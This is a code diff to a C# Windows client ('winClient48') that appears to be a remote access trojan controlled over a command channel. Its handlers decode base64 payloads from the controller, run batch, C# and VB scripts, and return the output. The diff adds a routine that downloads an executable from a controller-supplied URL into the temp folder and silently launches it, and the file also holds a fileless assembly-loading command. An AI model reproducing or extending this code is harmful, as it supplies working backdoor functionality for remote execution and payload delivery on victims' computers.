@@ -19,11 +19,13 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net;
+using System.Net.Http;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
+using System.Security.Policy;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -2344,27 +2346,36 @@ namespace winClient48
 
                     if (cmd[1] == "bat")
                     {
-                        string szPayload = clsCrypto.b64D2Str(cmd[2]);
-                        string szParam = clsCrypto.b64D2Str(cmd[3]);
+                        _ = Task.Run(() =>
+                        {
+                            string szPayload = clsCrypto.b64D2Str(cmd[2]);
+                            string szParam = clsCrypto.b64D2Str(cmd[3]);
 
-                        var x = funcRunScript.ExecBatch(szPayload, szParam.Split(' '));
-                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            var x = funcRunScript.ExecBatch(szPayload, szParam.Split(' '));
+                            v.SendCommand($"exec|{cmd[1]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
+                        });
                     }
                     else if (cmd[1] == "cs")
                     {
-                        string szPayload = clsCrypto.b64D2Str(cmd[2]);
-                        string szParam = clsCrypto.b64D2Str(cmd[3]);
+                        _ = Task.Run(() =>
+                        {
+                            string szPayload = clsCrypto.b64D2Str(cmd[2]);
+                            string szParam = clsCrypto.b64D2Str(cmd[3]);
 
-                        var x = funcRunScript.EvaluateCS(szPayload, szParam.Split(' '));
-                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            var x = funcRunScript.EvaluateCS(szPayload, szParam.Split(' '));
+                            v.SendCommand($"exec|{cmd[1]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
+                        });
                     }
                     else if (cmd[1] == "vb")
                     {
-                        string szPayload = clsCrypto.b64D2Str(cmd[2]);
-                        string szParam = clsCrypto.b64D2Str(cmd[3]);
+                        _ = Task.Run(() =>
+                        {
+                            string szPayload = clsCrypto.b64D2Str(cmd[2]);
+                            string szParam = clsCrypto.b64D2Str(cmd[3]);
 
-                        var x = funcRunScript.EvaluateVB(szPayload, szParam.Split(' '));
-                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            var x = funcRunScript.EvaluateVB(szPayload, szParam.Split(' '));
+                            v.SendCommand($"exec|{cmd[1]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
+                        });
                     }
                     else if (cmd[1] == "file")
                     {
@@ -2414,23 +2425,74 @@ namespace winClient48
                     }
                     else if (cmd[1] == "url")
                     {
+                        string fnFormat(string szUrl)
+                        {
+                            if (!szUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
+                                !szUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
+                            {
+                                szUrl = "https://" + szUrl;
+                            }
+
+                            return szUrl;
+                        }
+
                         string szURL = clsCrypto.b64D2Str(cmd[3]);
+                        szURL = fnFormat(szURL);
+
                         if (cmd[2] == "open")
                         {
                             ProcessStartInfo psi = new ProcessStartInfo()
                             {
-                                FileName = "cmd.exe",
-                                Arguments = $"/C start \"{szURL}\"",
+                                FileName = szURL,
+                                UseShellExecute = true,
                             };
-                            Process p = new Process();
-                            p.StartInfo = psi;
-                            p.Start();
+
+                            Process.Start(psi);
 
                             v.SendCommand("exec|url|open|1");
                         }
                         else if (cmd[2] == "run")
                         {
+                            _ = Task.Run(async () =>
+                            {
+                                (int nCode, string szMsg) ret = (0, string.Empty);
 
+                                try
+                                {
+                                    string szLocalPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+                                    using (HttpClient client = new HttpClient())
+                                    {
+                                        byte[] abData = await client.GetByteArrayAsync(szURL);
+                                        File.WriteAllBytes(szLocalPath, abData);
+
+                                        if (!File.Exists(szLocalPath))
+                                            throw new Exception("File not found: " + szLocalPath);
+
+                                        Process.Start(new ProcessStartInfo
+                                        {
+                                            FileName = szLocalPath,
+                                            UseShellExecute = true,
+                                            CreateNoWindow = true,
+                                        });
+                                    }
+
+                                    ret.nCode = 1;
+                                }
+                                catch (Exception ex)
+                                {
+                                    ret.szMsg = ex.Message;
+                                }
+
+                                v.fnSendCommand(new string[]
+                                {
+                                    "exec",
+                                    "url",
+                                    "run",
+                                    cmd[3], //base64 value of URL.
+                                    ret.nCode.ToString(),
+                                    clsCrypto.b64E2Str(ret.szMsg),
+                                });
+                            });
                         }
                     }
                 }
@@ -2665,7 +2727,6 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-
                     string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                     byte[] abAssembly = Convert.FromBase64String(cmd[3]);
                     clsfnLoader loader = new clsfnLoader();
